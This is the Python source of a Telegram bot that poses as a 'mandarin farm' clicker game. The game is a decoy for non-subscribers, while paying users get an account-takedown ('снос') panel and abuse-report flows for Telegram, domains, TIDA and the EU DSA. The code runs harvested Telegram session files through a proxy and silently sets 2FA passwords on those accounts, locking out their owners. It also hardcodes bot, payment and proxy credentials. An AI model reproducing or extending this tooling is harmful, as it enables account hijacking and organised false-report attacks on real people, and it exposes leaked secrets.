import asyncio
import json
import os
import re
import sqlite3
import time
import traceback
import random
import hashlib
import hmac
from urllib.parse import parse_qsl
from pathlib import Path
from typing import Any
from dataclasses import dataclass
from telebot.async_telebot import AsyncTeleBot
from telebot import types as bot_types
from telethon import TelegramClient, functions, types
from telethon.errors import FloodWaitError, PhoneNumberBannedError, PhoneNumberInvalidError
from telethon.tl.types import UserProfilePhoto
import aiohttp
import socks

# ==================== КОНФИГ ====================
BOT_TOKEN = "8956547037:AAHFDnzd5ioMsMu58sQyxW8MHIt49hBmFmw"
ADMIN_IDS = {1303406598, 283514062}
BOT_USERNAME = "mandarinilolbot"
API_ID = int(os.getenv("API_ID", "6"))
API_HASH = os.getenv("API_HASH", "eb06d4abfb49dc3eeb1aeb98ae0f581e")
CRYPTO_BOT_TOKEN = "618848:AAplUjsGTeUDc58DgL0UGQNygrwRbljjrDt"
REQUIRED_CHANNEL = os.getenv("REQUIRED_CHANNEL", "").strip()
OPERATOR_IDS = ADMIN_IDS.copy()
APP_URL = "https://webnova-digital.github.io/app/"
MINIAPP_API_HOST = os.getenv("MINIAPP_API_HOST", "0.0.0.0")
MINIAPP_API_PORT = int(os.getenv("MINIAPP_API_PORT", "8080"))
MINIAPP_API_PUBLIC_URL = os.getenv("MINIAPP_API_PUBLIC_URL", "")
DECOY_IMAGE = Path(__file__).resolve().parent / "assets" / "mandarins.png"
DB_PATH = "bot_database.db"

MANDARIN_TEXT = (
    "🍊 <b>Мандарины — ароматные цитрусовые плоды.</b>\n\n"
    "Они содержат витамин C, а их кожура богата эфирными маслами. "
    "Спелый мандарин обычно отличается яркой окраской, приятным запахом и упругой кожицей. "
    "Наслаждайтесь нашими свежими мандаринами каждый день! 🍃"
)

PROTECTED_TARGETS = [
    "nptov", "geysnos", "xernat", "mandarinilolbot", "adpxer", "sitsdef", "ncjyala4yme3yjk8",
    "t.me/nptov", "t.me/geysnos", "t.me/xernat", "t.me/mandarinilolbot", "t.me/adpxer", "t.me/sitsdef", "t.me/+ncjyala4yme3yjk8"
]

# Твой прокси: (host, port, user, password)
SINGLE_USA_PROXY = ("74.81.81.81", 824, "33869b4f7f4c58e2c81d__cr.us;anon.1", "7d5a01c9c7e12571")

ACHIEVEMENTS = {
    "first_tap":    {"name": "🖱 Первый тап",       "desc": "Собери первый мандарин",     "reward": 10},
    "tap_1000":     {"name": "👆 1 000 тапов",      "desc": "Сделай 1 000 тапов",          "reward": 500},
    "tap_10000":    {"name": "🔥 10 000 тапов",     "desc": "Сделай 10 000 тапов",         "reward": 2000},
    "level_2":      {"name": "🌿 Уровень 2",        "desc": "Достигни 2 уровня",           "reward": 200},
    "level_5":      {"name": "👑 Уровень 5",        "desc": "Достигни 5 уровня",           "reward": 5000},
    "level_10":     {"name": "🍊 Мандариновый Бог", "desc": "Достигни 10 уровня",          "reward": 50000},
    "first_case":   {"name": "📦 Первый кейс",      "desc": "Открой первый кейс",          "reward": 100},
    "case_master":  {"name": "🎁 Кейсоман",         "desc": "Открой 5 кейсов за день",     "reward": 1000},
    "clan_founder": {"name": "🛡 Основатель клана", "desc": "Создай клан",                 "reward": 3000},
    "first_ref":    {"name": "👥 Первый реферал",   "desc": "Пригласи первого друга",      "reward": 1000},
    "rich_100k":    {"name": "💰 Богач",            "desc": "Накопи 100 000 мандаринов",   "reward": 10000},
}

QUESTS = {
    "q_greenhouse": {"name": "🏡 Тепличный магнат", "desc": "Купи 3 теплицы в Сочи",    "target": 3,     "reward": 1000,  "field": "p2"},
    "q_plant":      {"name": "🌱 Рассада",          "desc": "Купи 5 рассады",            "target": 5,     "reward": 500,   "field": "p1"},
    "q_collect1k":  {"name": "🍊 Сборщик",          "desc": "Накопи 1 000 мандаринов",   "target": 1000,  "reward": 200,   "field": "mandarins"},
    "q_collect10k": {"name": "🍊 Плантатор",        "desc": "Накопи 10 000 мандаринов",  "target": 10000, "reward": 2000,  "field": "mandarins"},
    "q_level3":     {"name": "📈 Карьерист",        "desc": "Достигни 3 уровня",         "target": 3,     "reward": 500,   "field": "level"},
    "q_tap500":     {"name": "👆 Тапатель",         "desc": "Сделай 500 тапов",          "target": 500,   "reward": 300,   "field": "total_taps"},
}

def get_league(mandarins: float) -> str:
    if mandarins >= 1_000_000: return "💎 Алмаз"
    if mandarins >= 200_000:   return "🏆 Платина"
    if mandarins >= 50_000:    return "🥇 Золото"
    if mandarins >= 10_000:    return "🥈 Серебро"
    return "🥉 Бронза"

def get_league_icon(mandarins: float) -> str:
    if mandarins >= 1_000_000: return "💎"
    if mandarins >= 200_000:   return "🏆"
    if mandarins >= 50_000:    return "🥇"
    if mandarins >= 10_000:    return "🥈"
    return "🥉"

def init_db() -> None:
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            expires_at REAL DEFAULT 0,
            is_blocked INTEGER DEFAULT 0,
            mandarins REAL DEFAULT 0,
            click_power INTEGER DEFAULT 1,
            last_farm_time REAL DEFAULT 0,
            cases_opened_today INTEGER DEFAULT 0,
            last_case_reset REAL DEFAULT 0,
            last_action_time REAL DEFAULT 0,
            level INTEGER DEFAULT 1,
            max_energy INTEGER DEFAULT 1000,
            income INTEGER DEFAULT 0,
            clan_name TEXT DEFAULT '',
            daily_streak INTEGER DEFAULT 0,
            last_daily REAL DEFAULT 0,
            last_seen REAL DEFAULT 0,
            total_taps INTEGER DEFAULT 0,
            referrer_id INTEGER DEFAULT 0,
            referred_count INTEGER DEFAULT 0,
            p1_count INTEGER DEFAULT 0,
            p2_count INTEGER DEFAULT 0,
            cases_total INTEGER DEFAULT 0
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS domain_cases (
            case_id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            url TEXT,
            reason TEXT,
            status TEXT DEFAULT 'pending',
            admin_comment TEXT DEFAULT ''
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS referrals (
            referrer_id INTEGER,
            referred_id INTEGER PRIMARY KEY,
            created_at REAL
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS user_achievements (
            user_id INTEGER,
            achievement_id TEXT,
            unlocked_at REAL,
            PRIMARY KEY (user_id, achievement_id)
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS quest_progress (
            user_id INTEGER,
            quest_id TEXT,
            progress INTEGER DEFAULT 0,
            completed INTEGER DEFAULT 0,
            claimed INTEGER DEFAULT 0,
            PRIMARY KEY (user_id, quest_id)
        )
    """)
    try:
        cursor.execute("ALTER TABLE users ADD COLUMN daily_streak INTEGER DEFAULT 0")
        cursor.execute("ALTER TABLE users ADD COLUMN last_daily REAL DEFAULT 0")
        cursor.execute("ALTER TABLE users ADD COLUMN last_seen REAL DEFAULT 0")
        cursor.execute("ALTER TABLE users ADD COLUMN total_taps INTEGER DEFAULT 0")
        cursor.execute("ALTER TABLE users ADD COLUMN referrer_id INTEGER DEFAULT 0")
        cursor.execute("ALTER TABLE users ADD COLUMN referred_count INTEGER DEFAULT 0")
        cursor.execute("ALTER TABLE users ADD COLUMN p1_count INTEGER DEFAULT 0")
        cursor.execute("ALTER TABLE users ADD COLUMN p2_count INTEGER DEFAULT 0")
        cursor.execute("ALTER TABLE users ADD COLUMN cases_total INTEGER DEFAULT 0")
    except sqlite3.OperationalError:
        pass
    conn.commit()
    conn.close()

init_db()

def db_get_user(user_id: int) -> dict | None:
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    return dict(row) if row else None

def db_upsert_user(user_id: int, username: str, first_name: str) -> None:
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("""
        INSERT INTO users (user_id, username, first_name, expires_at, is_blocked, mandarins, click_power,
            last_farm_time, cases_opened_today, last_case_reset, last_action_time, level, max_energy,
            income, clan_name, daily_streak, last_daily, last_seen, total_taps, referrer_id,
            referred_count, p1_count, p2_count, cases_total)
        VALUES (?, ?, ?, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1000, 0, '', 0, 0, ?, 0, 0, 0, 0, 0, 0)
        ON CONFLICT(user_id) DO UPDATE SET username = excluded.username, first_name = excluded.first_name
    """, (user_id, username or "", first_name or "", time.time()))
    conn.commit()
    conn.close()

def db_set_subscription(user_id: int, days: int) -> float:
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT expires_at FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    current_time = time.time()
    current_expires = row[0] if row and row[0] is not None else 0
    new_expires = -1.0 if days == -1 else (max(current_time, current_expires) if current_expires > 0 else current_time) + (days * 86400)
    cursor.execute("UPDATE users SET expires_at = ? WHERE user_id = ?", (new_expires, user_id))
    conn.commit()
    conn.close()
    return new_expires

def db_toggle_block(user_id: int) -> int:
    user_data = db_get_user(user_id)
    new_status = 1 if (not user_data or user_data["is_blocked"] == 0) else 0
    conn = sqlite3.connect(DB_PATH)
    conn.cursor().execute("UPDATE users SET is_blocked = ? WHERE user_id = ?", (new_status, user_id))
    conn.commit()
    conn.close()
    return new_status

def db_get_all_users() -> list:
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, username, first_name, expires_at, is_blocked, mandarins, level, clan_name FROM users ORDER BY mandarins DESC LIMIT 10")
    rows = [dict(r) for r in cursor.fetchall()]
    conn.close()
    return rows

def db_get_top_users(limit: int = 50) -> list:
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute("""
        SELECT user_id, username, first_name, level, mandarins
        FROM users
        WHERE mandarins > 0 
          AND user_id != 6589732981
          AND (username IS NULL OR username != 'kllscmr')
        ORDER BY mandarins DESC
        LIMIT ?
    """, (limit,))
    rows = [dict(r) for r in cursor.fetchall()]
    conn.close()
    return rows

def is_protected_target(target: str) -> bool:
    clean = target.lower().strip().replace("https://", "").replace("http://", "").replace("@", "")
    return any(p in clean for p in PROTECTED_TARGETS)

def check_cooldown(user_id: int) -> tuple[bool, int]:
    if user_id in OPERATOR_IDS:
        return True, 0
    user_data = db_get_user(user_id)
    if not user_data:
        return True, 0
    diff = time.time() - user_data.get("last_action_time", 0)
    return (False, int(1800 - diff)) if diff < 1800 else (True, 0)

def update_cooldown(user_id: int) -> None:
    conn = sqlite3.connect(DB_PATH)
    conn.cursor().execute("UPDATE users SET last_action_time = ? WHERE user_id = ?", (time.time(), user_id))
    conn.commit()
    conn.close()

def check_case_limit(user_id: int) -> tuple[bool, int]:
    if user_id in OPERATOR_IDS:
        return True, 5
    user_data = db_get_user(user_id)
    if not user_data:
        return True, 5
    now = time.time()
    if now - user_data.get("last_case_reset", 0) > 86400:
        conn = sqlite3.connect(DB_PATH)
        conn.cursor().execute("UPDATE users SET cases_opened_today = 0, last_case_reset = ? WHERE user_id = ?", (now, user_id))
        conn.commit()
        conn.close()
        return True, 5
    remaining = 5 - user_data.get("cases_opened_today", 0)
    return (True, remaining) if remaining > 0 else (False, 0)

def increment_case_count(user_id: int) -> None:
    user_data = db_get_user(user_id)
    now = time.time()
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    if not user_data or now - user_data.get("last_case_reset", 0) > 86400:
        cursor.execute("UPDATE users SET cases_opened_today = 1, last_case_reset = ?, cases_total = cases_total + 1 WHERE user_id = ?", (now, user_id))
    else:
        cursor.execute("UPDATE users SET cases_opened_today = cases_opened_today + 1, cases_total = cases_total + 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def is_subscribed(user_id: int) -> bool:
    if user_id in OPERATOR_IDS:
        return True
    user_data = db_get_user(user_id)
    if not user_data:
        return False
    expires = user_data["expires_at"]
    return expires == -1.0 or expires > time.time()

def is_blocked(user_id: int) -> bool:
    user_data = db_get_user(user_id)
    return bool(user_data and user_data["is_blocked"] == 1)

def unlock_achievement(user_id: int, ach_id: str) -> bool:
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT 1 FROM user_achievements WHERE user_id = ? AND achievement_id = ?", (user_id, ach_id))
    if cursor.fetchone():
        conn.close()
        return False
    cursor.execute("INSERT INTO user_achievements (user_id, achievement_id, unlocked_at) VALUES (?, ?, ?)",
                   (user_id, ach_id, time.time()))
    conn.commit()
    conn.close()
    return True

def check_achievements(user_id: int, data: dict) -> list:
    mandarins = data.get("mandarins", 0)
    level = data.get("level", 1)
    total_taps = data.get("total_taps", 0)
    cases_today = data.get("cases_opened_today", 0)
    clan = data.get("clan_name", "")
    referred = data.get("referred_count", 0)
    
    checks = [
        ("first_tap", total_taps >= 1),
        ("tap_1000", total_taps >= 1000),
        ("tap_10000", total_taps >= 10000),
        ("level_2", level >= 2),
        ("level_5", level >= 5),
        ("level_10", level >= 10),
        ("case_master", cases_today >= 5),
        ("clan_founder", bool(clan)),
        ("first_ref", referred >= 1),
        ("rich_100k", mandarins >= 100000),
    ]
    
    new_achievements = []
    total_reward = 0
    for ach_id, condition in checks:
        if condition and ach_id in ACHIEVEMENTS:
            if unlock_achievement(user_id, ach_id):
                new_achievements.append(ach_id)
                total_reward += ACHIEVEMENTS[ach_id]["reward"]
    
    if total_reward > 0:
        conn = sqlite3.connect(DB_PATH)
        conn.cursor().execute("UPDATE users SET mandarins = mandarins + ? WHERE user_id = ?", (total_reward, user_id))
        conn.commit()
        conn.close()
    
    return new_achievements

def check_quests(user_id: int, data: dict) -> list:
    field_map = {
        "mandarins": data.get("mandarins", 0),
        "level": data.get("level", 1),
        "total_taps": data.get("total_taps", 0),
        "p1": data.get("p1_count", 0),
        "p2": data.get("p2_count", 0),
    }
    
    completed_quests = []
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    for quest_id, quest in QUESTS.items():
        field = quest["field"]
        target = quest["target"]
        current = field_map.get(field, 0)
        progress = min(int(current), target)
        
        cursor.execute("""
            INSERT INTO quest_progress (user_id, quest_id, progress, completed, claimed)
            VALUES (?, ?, ?, ?, 0)
            ON CONFLICT(user_id, quest_id) DO UPDATE SET progress = ?, completed = ?
        """, (user_id, quest_id, progress, 1 if progress >= target else 0,
              progress, 1 if progress >= target else 0))
        
        if progress >= target:
            completed_quests.append(quest_id)
    
    conn.commit()
    conn.close()
    return completed_quests

async def check_channel_subscription(user_id: int) -> bool:
    if user_id in OPERATOR_IDS:
        return True
    if not REQUIRED_CHANNEL:
        return True
    try:
        member = await bot.get_chat_member(REQUIRED_CHANNEL, user_id)
        return member.status in ["member", "creator", "administrator"]
    except Exception:
        return False

usa_session_meta: list[tuple[Path, Path | None]] = []
destroy_session_meta: list[tuple[Path, Path | None]] = []

def load_sessions_from_folders() -> tuple[int, int]:
    global usa_session_meta, destroy_session_meta
    usa_dir = Path("USA")
    usa_dir.mkdir(parents=True, exist_ok=True)
    usa_session_meta.clear()
    for file_path in usa_dir.glob("*.session"):
        json_path = file_path.with_suffix('.json')
        usa_session_meta.append((file_path, json_path if json_path.exists() else None))
    destroy_dir = Path("sessions")
    destroy_dir.mkdir(parents=True, exist_ok=True)
    destroy_session_meta.clear()
    for file_path in destroy_dir.glob("*.session"):
        json_path = file_path.with_suffix('.json')
        destroy_session_meta.append((file_path, json_path if json_path.exists() else None))
    return len(usa_session_meta), len(destroy_session_meta)

load_sessions_from_folders()

@dataclass
class UserFlow:
    operator_id: int
    phase: str = "idle"
    target_identity: str = ""
    target_phone: str = ""
    domain_url: str = ""
    domain_reason: str = ""
    tida_url: str = ""
    tida_text: str = ""
    # DSA fields added without touching existing features
    dsa_phone: str = ""
    dsa_link: str = ""
    dsa_reason_category: str = ""
    dsa_reason_subcategory: str = ""
    dsa_explanation: str = ""
    dsa_laws_links: str = ""
    dsa_country_choice: str = ""

@dataclass
class AdminFlow:
    operator_id: int
    action: str = ""
    extra_data: Any = None

bot = AsyncTeleBot(BOT_TOKEN)
user_flows: dict[int, UserFlow] = {}
admin_flows: dict[int, AdminFlow] = {}
tida_queue: asyncio.Queue = asyncio.Queue()
tida_lock: asyncio.Lock = asyncio.Lock()
tida_worker_started: bool = False

def get_telegram_client(sess_path: Path, json_path: Path | None, use_proxy: bool = False) -> TelegramClient:
    curr_api_id, curr_api_hash = API_ID, API_HASH
    if json_path and json_path.exists():
        try:
            with open(json_path, 'r', encoding='utf-8') as f:
                jdata = json.load(f)
            curr_api_id = int(jdata.get("app_id", jdata.get("api_id", API_ID)))
            curr_api_hash = str(jdata.get("app_hash", jdata.get("api_hash", API_HASH)))
        except Exception:
            pass
    
    proxy_config = None
    if use_proxy:
        p_host, p_port, p_user, p_pass = SINGLE_USA_PROXY
        proxy_config = (socks.SOCKS5, p_host, p_port, True, p_user, p_pass)

    return TelegramClient(
        str(sess_path.with_suffix('')), 
        curr_api_id, 
        curr_api_hash, 
        proxy=proxy_config,
        connection_retries=3
    )

async def auto_set_cloud_password(client: TelegramClient) -> None:
    try:
        if not await client.is_user_authorized():
            return
        
        pwd = await client(functions.account.GetPasswordRequest())
        if getattr(pwd, 'has_password', False):
            return  
        
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*"
        new_password = "".join(random.choice(chars) for _ in range(16))
        
        await client.edit_2fa(new_password=new_password)
        print(f"🔒 Автоматически установлен 2FA-пароль для сессии: {new_password}")
    except Exception as e:
        print(f"⚠️ Не удалось поставить автоматический 2FA пароль: {e}")

def subscription_keyboard() -> bot_types.InlineKeyboardMarkup:
    kb = bot_types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        bot_types.InlineKeyboardButton("📢 Подписаться", url="https://t.me/+8NJSSaKe0YphZmRk"),
        bot_types.InlineKeyboardButton("🔄 Проверить", callback_data="sub:check")
    )
    return kb

def decoy_keyboard() -> bot_types.InlineKeyboardMarkup:
    kb = bot_types.InlineKeyboardMarkup(row_width=1)
    kb.add(
        bot_types.InlineKeyboardButton("🍊 Мандариновая Ферма (Mini App)", web_app=bot_types.WebAppInfo(url=APP_URL)),
        bot_types.InlineKeyboardButton("👤 Профиль", callback_data="menu:profile")
    )
    return kb

def subscriber_keyboard() -> bot_types.InlineKeyboardMarkup:
    kb = bot_types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        bot_types.InlineKeyboardButton("🔥 Снос сессий", callback_data="destroy:start"),
        bot_types.InlineKeyboardButton("🛡 Блок домена", callback_data="domain:start"),
        bot_types.InlineKeyboardButton("🇺🇸 TIDA USA", callback_data="tida:start"),
        bot_types.InlineKeyboardButton("🇪🇺 DSA Report", callback_data="dsa:start"),
        bot_types.InlineKeyboardButton("👤 Профиль", callback_data="menu:profile"),
        bot_types.InlineKeyboardButton("🍊 Mini App (Ферма)", web_app=bot_types.WebAppInfo(url=APP_URL)),
        bot_types.InlineKeyboardButton("👥 Рефералы", callback_data="ref:menu"),
        bot_types.InlineKeyboardButton("🎁 Ежедневный бонус", callback_data="daily:claim")
    )
    return kb

def profile_keyboard(has_sub: bool) -> bot_types.InlineKeyboardMarkup:
    kb = bot_types.InlineKeyboardMarkup(row_width=1)
    if not has_sub:
        kb.add(bot_types.InlineKeyboardButton("💳 Купить подписку", callback_data="pay:methods"))
    kb.add(
        bot_types.InlineKeyboardButton("👥 Рефералы", callback_data="ref:menu"),
        bot_types.InlineKeyboardButton("⬅️ Главное меню", callback_data="menu:main")
    )
    return kb

def admin_main_keyboard() -> bot_types.InlineKeyboardMarkup:
    kb = bot_types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        bot_types.InlineKeyboardButton("📢 Рассылка", callback_data="admin:broadcast"),
        bot_types.InlineKeyboardButton("🔥 Снос сессий", callback_data="admin:destroy"),
        bot_types.InlineKeyboardButton("🚫 Блок юзера", callback_data="admin:block"),
        bot_types.InlineKeyboardButton("✅ Разблок", callback_data="admin:unblock"),
        bot_types.InlineKeyboardButton("🎁 Дать sub", callback_data="admin:grant"),
        bot_types.InlineKeyboardButton("❌ Забрать sub", callback_data="admin:revoke"),
        bot_types.InlineKeyboardButton("🍊 Выдать мандарины", callback_data="admin:mandarins"),
        bot_types.InlineKeyboardButton("📊 Статистика", callback_data="admin:stats"),
        bot_types.InlineKeyboardButton("🔄 Пересканировать папки", callback_data="admin:reload_sessions"),
    )
    kb.add(bot_types.InlineKeyboardButton("⬅️ В обычное меню", callback_data="menu:main"))
    return kb

def allowed_user(user: Any) -> bool:
    return bool(user) and not is_blocked(user.id)

async def send_mandarin_decoy(chat_id: int) -> None:
    if DECOY_IMAGE.is_file():
        with DECOY_IMAGE.open("rb") as photo:
            await bot.send_photo(chat_id, photo, caption=MANDARIN_TEXT, parse_mode="HTML", reply_markup=decoy_keyboard())
        return
    await bot.send_message(chat_id, MANDARIN_TEXT, parse_mode="HTML", reply_markup=decoy_keyboard())

@bot.message_handler(commands=["start", "menu"])
async def start_command(message: Any) -> None:
    user = message.from_user
    if not allowed_user(user):
        return
    db_upsert_user(user.id, user.username, user.first_name)
    
    args = message.text.split()
    if len(args) > 1 and args[1].startswith("ref_"):
        try:
            referrer_id = int(args[1][4:])
            if referrer_id != user.id:
                conn = sqlite3.connect(DB_PATH)
                cursor = conn.cursor()
                cursor.execute("SELECT referrer_id FROM users WHERE user_id = ?", (user.id,))
                row = cursor.fetchone()
                if row and row[0] == 0:
                    cursor.execute("UPDATE users SET referrer_id = ? WHERE user_id = ?", (referrer_id, user.id))
                    cursor.execute("UPDATE users SET referred_count = referred_count + 1 WHERE user_id = ?", (referrer_id,))
                    cursor.execute("INSERT OR IGNORE INTO referrals (referrer_id, referred_id, created_at) VALUES (?, ?, ?)",
                                   (referrer_id, user.id, time.time()))
                    cursor.execute("UPDATE users SET mandarins = mandarins + 5000 WHERE user_id = ?", (referrer_id,))
                    cursor.execute("UPDATE users SET mandarins = mandarins + 2000 WHERE user_id = ?", (user.id,))
                    conn.commit()
                    conn.close()
                    referrer_data = db_get_user(referrer_id)
                    if referrer_data and referrer_data["referred_count"] >= 1:
                        if unlock_achievement(referrer_id, "first_ref"):
                            conn2 = sqlite3.connect(DB_PATH)
                            conn2.cursor().execute("UPDATE users SET mandarins = mandarins + ? WHERE user_id = ?",
                                                   (ACHIEVEMENTS["first_ref"]["reward"], referrer_id))
                            conn2.commit()
                            conn2.close()
                    try:
                        await bot.send_message(referrer_id,
                            f"👥 <b>Новый реферал!</b>\n@{user.username or user.first_name} присоединился по вашей ссылке!\n\n🎁 <b>+5 000 🍊</b>",
                            parse_mode="HTML")
                    except Exception:
                        pass
                    await bot.send_message(message.chat.id,
                        "🎁 <b>Добро пожаловать!</b>\nВам начислено <b>2 000 🍊</b> за приглашение!",
                        parse_mode="HTML")
        except (ValueError, IndexError):
            pass
    
    if not await check_channel_subscription(user.id):
        await bot.send_message(message.chat.id, "⚠️ <b>Для пользования ботом необходимо подписаться на канал!</b>",
                               parse_mode="HTML", reply_markup=subscription_keyboard())
        return
    if is_subscribed(user.id):
        await bot.send_message(message.chat.id, "⚡️ <b>Панель управления:</b>", parse_mode="HTML", reply_markup=subscriber_keyboard())
    else:
        await send_mandarin_decoy(message.chat.id)

@bot.message_handler(commands=["daily"])
async def daily_command(message: Any) -> None:
    user = message.from_user
    if not allowed_user(user):
        return
    db_upsert_user(user.id, user.username, user.first_name)
    user_data = db_get_user(user.id)
    now = time.time()
    last_daily = user_data.get("last_daily", 0)
    streak = user_data.get("daily_streak", 0)
    
    if now - last_daily < 86400:
        remaining = 86400 - (now - last_daily)
        hours = int(remaining // 3600)
        mins = int((remaining % 3600) // 60)
        await bot.send_message(message.chat.id, f"⏳ Следующий бонус через <b>{hours}ч {mins}м</b>", parse_mode="HTML")
        return
    
    if now - last_daily > 172800:
        streak = 0
    streak += 1
    
    rewards = {1: 100, 2: 200, 3: 500, 4: 700, 5: 1000, 6: 1500, 7: 2000}
    reward = rewards.get(min(streak, 7), 2000)
    
    conn = sqlite3.connect(DB_PATH)
    conn.cursor().execute("UPDATE users SET mandarins = mandarins + ?, daily_streak = ?, last_daily = ? WHERE user_id = ?",
                          (reward, streak, now, user.id))
    conn.commit()
    conn.close()
    
    kb = bot_types.InlineKeyboardMarkup().add(
        bot_types.InlineKeyboardButton("🍊 Играть", web_app=bot_types.WebAppInfo(url=APP_URL))
    )
    await bot.send_message(message.chat.id,
        f"🎁 <b>Ежедневный бонус!</b>\n\n📅 День: <b>{streak}</b>\n🍊 Награда: <b>+{reward}</b>\n\n"
        f"{'🔥' if streak >= 7 else '⏰'} Возвращайся завтра за новым бонусом!",
        parse_mode="HTML", reply_markup=kb)

@bot.message_handler(commands=["addmandarins"])
async def addmandarins_command(message: Any) -> None:
    if message.from_user.id not in ADMIN_IDS:
        return
    parts = message.text.split()
    if len(parts) >= 3 and parts[1].isdigit() and parts[2].isdigit():
        target_id, amount = int(parts[1]), int(parts[2])
        db_upsert_user(target_id, "", "")
        conn = sqlite3.connect(DB_PATH)
        conn.cursor().execute("UPDATE users SET mandarins = mandarins + ? WHERE user_id = ?", (amount, target_id))
        conn.commit()
        conn.close()
        await bot.send_message(message.chat.id, f"✅ Начислено {amount} 🍊 пользователю <code>{target_id}</code>", parse_mode="HTML")
        try:
            await bot.send_message(target_id, f"🍊 Администратор начислил вам <b>{amount}</b> мандаринов!", parse_mode="HTML")
        except Exception:
            pass
    else:
        await bot.send_message(message.chat.id, "❌ Формат: <code>/addmandarins ID КОЛИЧЕСТВО</code>", parse_mode="HTML")

@bot.message_handler(commands=["top"])
async def top_command(message: Any) -> None:
    top_users = db_get_top_users(10)
    text = "🏆 <b>ТОП ИГРОКОВ МАНДАРИНОВОЙ ИМПЕРИИ</b>\n\n"
    if not top_users:
        text += "😴 Пока нет активных игроков. Стань первым!"
    else:
        medals = ["🥇", "🥈", "🥉"]
        for idx, u in enumerate(top_users):
            name = u.get("username") or u.get("first_name") or f"ID{u['user_id']}"
            medal = medals[idx] if idx < 3 else f"{idx+1}."
            league = get_league_icon(u["mandarins"])
            text += f"{medal} @{name} {league} Ур.{u['level']} — <b>{int(u['mandarins']):,}</b> 🍊\n"
    await bot.send_message(message.chat.id, text, parse_mode="HTML")

@bot.message_handler(commands=["getstate"])
async def getstate_command(message: Any) -> None:
    user_data = db_get_user(message.from_user.id)
    if not user_data:
        return
    league = get_league(user_data["mandarins"])
    await bot.send_message(message.chat.id,
        f"📊 <b>Ваш профиль в БД:</b>\n\n"
        f"👤 ID: <code>{user_data['user_id']}</code>\n"
        f"🏷 Username: @{user_data['username'] or 'нет'}\n"
        f"🍊 Баланс: <b>{int(user_data['mandarins']):,}</b>\n"
        f"{league} Лига: <b>{league}</b>\n"
        f"📈 Уровень: <b>{user_data['level']}</b>\n"
        f"⚡ Сила тапа: <b>{user_data['click_power']}</b>\n"
        f"🏡 Доход/сек: <b>{user_data['income']}</b>\n"
        f"🔋 Макс энергия: <b>{user_data['max_energy']}</b>\n"
        f"🎁 Кейсов сегодня: <b>{user_data['cases_opened_today']}/5</b> (всего: {user_data['cases_total']})\n"
        f"🛡️ Клан: <b>{user_data['clan_name'] or 'Нет'}</b>\n"
        f"👥 Рефералов: <b>{user_data['referred_count']}</b>\n"
        f"📅 Дней подряд: <b>{user_data['daily_streak']}</b>\n"
        f"👆 Всего тапов: <b>{user_data['total_taps']:,}</b>",
        parse_mode="HTML")

@bot.message_handler(commands=["admin"])
async def admin_command(message: Any) -> None:
    if message.from_user.id not in ADMIN_IDS:
        return
    await bot.send_message(message.chat.id,
        f"👑 <b>Панель администратора</b>\n"
        f"Сессий USA: <b>{len(usa_session_meta)}</b>\n"
        f"Сессий Сноса: <b>{len(destroy_session_meta)}</b>\n"
        f"Админы: {', '.join(str(x) for x in ADMIN_IDS)}",
        parse_mode="HTML", reply_markup=admin_main_keyboard())

@bot.message_handler(commands=["ref"])
async def ref_command(message: Any) -> None:
    user = message.from_user
    if not allowed_user(user):
        return
    db_upsert_user(user.id, user.username, user.first_name)
    user_data = db_get_user(user.id)
    ref_link = f"https://t.me/{BOT_USERNAME}?start=ref_{user.id}"
    referred = user_data["referred_count"] if user_data else 0
    kb = bot_types.InlineKeyboardMarkup().add(
        bot_types.InlineKeyboardButton("🔗 Поделиться", url=f"https://t.me/share/url?url={ref_link}&text=Играй в Мандариновую Ферму! 🍊")
    )
    await bot.send_message(message.chat.id,
        f"👥 <b>Реферальная система</b>\n\n"
        f"🔗 Ваша ссылка:\n<code>{ref_link}</code>\n\n"
        f"👥 Приглашено: <b>{referred}</b>\n"
        f"💰 Заработано: <b>{referred * 5000:,}</b> 🍊\n\n"
        f"📋 Условия:\n"
        f"• Вы получаете <b>5 000 🍊</b> за каждого друга\n"
        f"• Друг получает <b>2 000 🍊</b> при регистрации",
        parse_mode="HTML", reply_markup=kb)

# ==================== DSA REPORT FLOW ====================

@bot.callback_query_handler(func=lambda call: call.data == "dsa:start")
async def dsa_start_callback(call: Any) -> None:
    user = call.from_user
    if not allowed_user(user) or not is_subscribed(user.id):
        await bot.answer_callback_query(call.id, "Требуется подписка!")
        return
    user_flows[user.id] = UserFlow(operator_id=user.id, phase="dsa_awaiting_phone")
    await bot.answer_callback_query(call.id)
    kb = bot_types.InlineKeyboardMarkup().add(bot_types.InlineKeyboardButton("❌ Отмена", callback_data="cancel"))
    await bot.send_message(call.message.chat.id,
        "🇪🇺 <b>Подача жалобы DSA</b>\n\n"
        "<b>Шаг 1:</b> Введите номер телефона (в международном формате, например +49...):",
        parse_mode="HTML", reply_markup=kb)

